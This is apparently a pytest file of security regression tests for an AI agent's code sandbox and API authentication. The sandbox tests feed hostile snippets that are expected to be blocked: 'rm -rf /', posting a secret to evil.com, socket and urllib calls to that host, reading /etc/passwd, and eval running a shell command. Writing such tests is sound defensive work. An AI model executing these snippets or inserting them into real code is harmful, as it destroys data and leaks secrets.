"""tests/test_security.py - Security regression tests."""

class TestCodeSandbox:
    def test_os_import_blocked(self):
        from agent.sandbox import _is_safe
        ok, _ = _is_safe("import os\nos.system('rm -rf /')")
        assert not ok

    def test_socket_import_blocked(self):
        """BUG-16 regression: network calls must be blocked."""
        from agent.sandbox import _is_safe
        ok, _ = _is_safe("import socket\ns = socket.socket()\ns.connect(('evil.com', 80))")
        assert not ok

    def test_requests_blocked(self):
        from agent.sandbox import _is_safe
        ok, _ = _is_safe("import requests\nrequests.post('https://evil.com', data='secret')")
        assert not ok

    def test_urllib_blocked(self):
        from agent.sandbox import _is_safe
        ok, _ = _is_safe("import urllib.request\nurllib.request.urlopen('http://evil.com')")
        assert not ok

    def test_open_blocked(self):
        from agent.sandbox import _is_safe
        ok, _ = _is_safe("f = open('/etc/passwd'); print(f.read())")
        assert not ok

    def test_eval_blocked(self):
        from agent.sandbox import _is_safe
        ok, _ = _is_safe("eval('__import__(\"os\").system(\"id\")')")
        assert not ok

    def test_safe_code_allowed(self):
        from agent.sandbox import _is_safe
        ok, reason = _is_safe("x = [1, 2, 3]\nprint(sum(x))")
        assert ok, f"Safe code was blocked by: {reason}"


class TestHealthEndpoint:
    def test_health_returns_503_when_empty(self):
        """BUG-19 regression: empty index must return 503 not 200."""
        from fastapi.testclient import TestClient
        from api.main import app
        client = TestClient(app)
        resp = client.get("/health")
        data = resp.json()
        if data["index"].get("project_docs_chunks", 0) == 0:
            assert resp.status_code == 503
            assert data["status"] in ("degraded", "error")


class TestAuthentication:
    def test_missing_key_returns_403(self, monkeypatch):
        """BUG-05 regression: auth must require explicit disable."""
        import api.main as m
        monkeypatch.setenv("DISABLE_AUTH", "false")
        monkeypatch.setenv("AGENT_API_KEY", "real-secret-not-default")
        # Patch the runtime values directly on the module
        monkeypatch.setattr(m, "_AUTH_DISABLED", False)
        monkeypatch.setattr(m, "_API_KEY", "real-secret-not-default")
        from fastapi.testclient import TestClient
        client = TestClient(m.app)
        resp = client.post("/query", json={"query": "hello"})
        assert resp.status_code == 403

    def test_disable_auth_allows_request(self, monkeypatch):
        monkeypatch.setenv("DISABLE_AUTH", "true")
        from fastapi.testclient import TestClient
        from api.main import app
        client = TestClient(app)
        resp = client.get("/health")
        assert resp.status_code in (200, 503)
